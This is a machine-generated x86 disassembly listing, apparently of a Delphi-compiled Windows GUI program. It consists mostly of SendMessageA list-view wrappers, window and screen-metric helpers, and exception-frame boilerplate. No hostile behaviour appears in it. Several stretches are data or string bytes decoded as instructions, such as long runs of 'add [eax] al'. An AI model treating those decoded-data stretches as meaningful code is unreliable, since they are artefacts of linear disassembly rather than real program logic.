arpl [ esp + ecx * 2 + 0x69 ] si
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ esi + 0x80042 ] ah
add [ eax ] al
push 0x4c0042a5
xor eax 0x35580040
mov ah 0xa5
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
movsd [ edi ] [ esi ]
inc edx
add [ eax ] cl
add [ eax ] al
add [ eax + 0x4c004010 ] dh
xor eax 0x35580040
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ eax ] dl
cmpsd [ esi ] [ edi ]
inc edx
add ah ch
sub al [ eax ]
push esp
cmpsd [ esi ] [ edi ]
inc edx
add [ eax - 0x59 ] al
inc edx
add [ esp + edx * 2 ] cl
dec edi
jb r-xdata
cli
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
arpl [ ebx - 0x70 ] bp
push esp
push ebx
je r-xdata
jb r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_418f60
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ eax ] dl
cmpsd [ esi ] [ edi ]
inc edx
add [ edi + 0x42 ] dh
add [ edi + 0x42 ] dl
add [ eax - 0x59 ] al
inc edx
add [ esi ] al
dec esp
imul esi [ ebx + 0x74 ] 0x1c00408d
cmpsb [ esi ] [ edi ]
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
cmpsb [ esi ] [ edi ]
inc edx
add [ eax ] cl
add [ eax ] al
add [ eax - 0x5b ] ch
inc edx
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
mov eax edi
call sub_40331c
sub_42a630
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4032ec
mov [ esi + 0x10 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_42a688
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_418f60
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
mov eax edi
call sub_40331c
sub_42a6cc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4032ec
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_42a710
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_40331c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40330c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_42a754
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_418be8
mov eax esi
pop esi
pop ebx
retn
sub_42a780
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42a7a5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a7ac
retn
sub_42a7c0
cmp [ rw-data ] 0x0
jne r-xdata
retn
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_42a820
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_42a7c0
xor eax eax
jmp r-xdata
push ebx
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebx
retn
mov al 0x1
sub_42a92c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
push 0x1003
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42a9d0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor edx edx
mov eax edi
call sub_406de0
push eax
push esi
push 0x100c
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42aa04
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
push 0x0
push edi
push 0x100e
push esi
call SendMessageA
mov eax [ ebp + 0x8 ]
mov [ ebx ] eax
push ebx
push edi
push 0x100e
push esi
call SendMessageA
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_42aa50
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x1015
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42aa98
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x101a
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42aaf4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor edx edx
mov eax edi
call sub_406de0
push eax
push esi
push 0x101e
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42ab18
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x1021
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42ab8c
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x102a
push ebx
call SendMessageA
test eax eax
setne al
neg al
sbb eax eax
pop esi
pop ebx
retn
sub_42abac
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] ecx
lea eax [ ebp - 0x28 ]
push eax
push esi
push 0x102b
push ebx
call SendMessageA
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42abec
push ebx
push esi
mov esi edx
mov ebx eax
push 0xf000
push esi
push 0x102c
push ebx
call SendMessageA
shr eax 0xc
dec eax
pop esi
pop ebx
retn
sub_42ac0c
add esp 0xffffffd8
mov [ esp + 0x10 ] 0xf000
and ecx 0x1
inc ecx
shl ecx 0xc
mov [ esp + 0xc ] ecx
mov ecx esp
push ecx
push edx
push 0x102b
push eax
call SendMessageA
add esp 0x28
retn
sub_42ac38
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebp - 0x20 ] ecx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x28 ]
push eax
push esi
push 0x102e
push ebx
call SendMessageA
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42ac88
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
push 0x1030
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42accc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x103a
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42ace8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x103b
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42ad04
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x1041
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42ad90
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x1002
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42adac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x1004
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42adc8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x1006
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42adf4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42ae19
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ae20
retn
sub_42ae2c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4045c8
xor eax eax
push ebp
push sub_42aeeb
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
xor eax eax
mov al bl
cmp [ eax + rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42aef2
lea eax [ ebp - 0x4 ]
call sub_404118
retn
cmp [ rw-data ] 0x0
je r-xdata
xor esi esi
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov esi edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4045d8
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov al bl
mov [ eax + rw-data ] 0x1
mov [ rw-data ] 0x1
test esi esi
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_42ae2c
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_404118
sub_42af14
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
or eax 0xffffffff
mov edx ebx
add edx 0xffffffb4
sub edx 0x2
jb r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
xor eax eax
call sub_42ae2c
mov [ rw-data ] eax
push ebx
call [ rw-data ]
jmp r-xdata
xor eax eax
jmp r-xdata
je r-xdata
pop ebx
pop ebp
retn 0x4
cmp eax 0xffffffff
jne r-xdata
xor ebx ebx
jmp r-xdata
dec edx
je r-xdata
push ebx
call GetSystemMetrics
mov ebx 0x1
dec edx
sub edx 0x2
jae r-xdata
mov eax 0x1
jmp r-xdata
sub_42af9c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor esi esi
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x2
call sub_42ae2c
mov [ rw-data ] eax
push edi
push ebx
call [ rw-data ]
mov esi eax
jmp r-xdata
mov esi 0x12340042
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ ebx + 0xc ] 0x0
jle r-xdata
push 0x0
call [ rw-data ]
cmp eax [ ebx ]
jle r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebx + 0x4 ]
jle r-xdata
sub_42b02c
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
and eax 0x3
test al al
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x1
call sub_42ae2c
mov [ rw-data ] eax
push ebx
push esi
call [ rw-data ]
jmp r-xdata
push esi
call IsIconic
test eax eax
je r-xdata
mov eax 0x12340042
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetWindowPlacement
jmp r-xdata
push ebx
lea eax [ ebp - 0x10 ]
push eax
call sub_42af9c
sub_42b0c2
add [ eax ] al
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x3
call sub_42ae2c
mov [ rw-data ] eax
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov ebx 0x12340042
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push 0x0
call [ rw-data ]
cmp esi eax
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_42b143
call [ eax ]
add [ eax ] al
add [ ebp + 0x6f ] cl
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x6d6f7246
push eax
outsd
imul ebp [ esi + 0x74 ] 0x0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_42ae2c
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_42b230
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x5
call sub_42ae2c
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_42b304
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x6
call sub_42ae2c
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_42b3d8
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x7
call sub_42ae2c
mov [ rw-data ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
push 0x0
call [ rw-data ]
mov [ ebp - 0x14 ] eax
push 0x1
call [ rw-data ]
mov [ ebp - 0x10 ] eax
test esi esi
je r-xdata
test edi edi
je r-xdata
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetClipBox
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push esi
call GetDCOrgEx
test eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push esi
push 0x12340042
call [ ebp + 0x10 ]
mov ebx eax
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
neg eax
push eax
mov eax [ ebp - 0x8 ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x1
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_42b573
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42b599
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b5a0
retn
sub_42b5b4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b5d9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b5e0
retn
sub_42b5ed
mov ch 0x42
add [ edi ] cl
or eax 0x6c654849
dec eax
insb
jo r-xdata
insb
arpl [ gs : edi + ebp * 2 + 0x72 ] si
and al 0x11
inc eax
add [ ecx ] al
pop eax
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
adc ecx [ ecx + 0x45 ]
outsb
je r-xdata
push [ eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b5e0
retn
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
inc edx
outsb
dec eax
insb
adc [ ebx + 0x4fc000b9 ] esp
jae r-xdata
outsd
outsb
je r-xdata
mov bh 0x42
add [ eax + eax ] cl
popad
outsb
popad
jb r-xdata
lodsd [ esi ]
jns r-xdata
imul esp [ ebp + 0x77 ] 0xb6587265
inc edx
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
add [ edi ] cl
adc [ ecx + 0x43 ] ecx
jne r-xdata
add bh bh
[ esi + esi * 4 + 0x42 ]
lodsd [ esi ]
imul esp [ ebp + 0x77 ] 0x11247265
inc eax
add [ ecx ] al
xchg ebx eax
cld
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add al bh
mov bh 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] cl
mov eax 0xc0042
add [ eax ] al
mov al 0x10
inc eax
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax - 0x4a ] bl
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edi + esi * 4 + 0x42 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
adc [ eax ] eax
add [ esi - 0x6d ] esp
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
add [ eax ] al
in al dx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi * 4 + 0xc0042 ] dl
outsb
je r-xdata
cwde
mov dh 0x42
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
adc [ eax ] eax
add [ ebx + edx * 4 - 0x4 ] esp
add [ edi ] cl
or al 0x49
dec eax
insb
jo r-xdata
mov bh 0x42
outsb
je r-xdata
adc eax 0x65705349
arpl [ ecx + 0x61 ] bp
insb
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
je r-xdata
jns r-xdata
add [ edi ] cl
outsb
je r-xdata
dec [ ebx + 0x42b628c0 ]
add [ edi ] cl
or ecx [ ecx + 0x48 ]
insb
jo r-xdata
add bh bh
xor [ edx ] ecx
add [ eax ] al
add eax 0xffffffd4
jmp r-xdata
imul esp [ ebp + 0x77 ] 0x6f4e7265
mov eax eax
push esi
je r-xdata
insb
jo r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
jae r-xdata
add ah ch
jae r-xdata
jns r-xdata
add al al
dec edi
jae r-xdata
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
insd
dec eax
insb
jo r-xdata
jo r-xdata
insb
je r-xdata
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
jae r-xdata
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42c37f
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
inc edx
add [ eax + eax ] al
insd
inc ebp
js r-xdata
dec ecx
imul esp [ ebp + 0x77 ] 0xb6947265
inc edx
add [ ecx ] al
xchg bx ax
cld
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ eax * 2 + 0x706c6548 ] dl
push ebx
jns r-xdata
inc eax
outsb
je r-xdata
add bh bh
dec [ ebx + 0x42b714c0 ]
mov dh 0x42
add bh bh
call esp
add [ ecx ] al
xchg bx ax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
mov dh 0x42
insd
and al 0x11
inc eax
add [ ecx ] al
push ebx
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
js r-xdata
movlps [ ecx + 0x45 ] xmm1
add [ edi ] cl
add bh bh
dec [ ebx + 0x42b698c0 ]
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_40416c
add [ eax ] al
andps xmm1 [ eax + 0x65 ]
insb
jo r-xdata
add al 0x0
jo r-xdata
imul ebp [ edi + 0x6e ] 0xf800408d
mov bh 0x42
add [ eax ] al
add [ eax ] al
jae r-xdata
jo r-xdata
cmp cl [ ecx ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be48
call sub_403ad0
jmp r-xdata
int3
mov eax eax
lea eax [ eax ]
xchg esp eax
mov bh 0x42
add [ eax ] al
add [ eax ] al
add bh bh
dec [ ebp - 0x486bffc0 ]
inc edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c386
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404bb4
lea eax [ ebp - 0x8 ]
call sub_405ab8
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405afc
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_42a66c
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_405ad0
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405afc
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_42b9b0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_42ba26
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
mov [ eax ] edx
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ rw-data ]
call sub_42bb3c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_405ad0
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ba2d
lea eax [ ebp - 0x8 ]
call sub_405ab8
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42bac8
mov [ rw-data ] eax
sub_42ba34
push ebp
mov ebp esp
push ebx
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov [ ebx ] eax
mov eax ebx
mov edx [ rw-data ]
test edx edx
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42bac8
mov [ rw-data ] eax
mov ecx r-xdata
call sub_405afc
xor eax eax
pop ebx
pop ebp
retn
sub edx 0xfffffff8
sub_42ba8c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_405ad0
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_42bac8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4032ec
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a630
mov [ esi + 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a630
mov [ esi + 0x14 ] eax
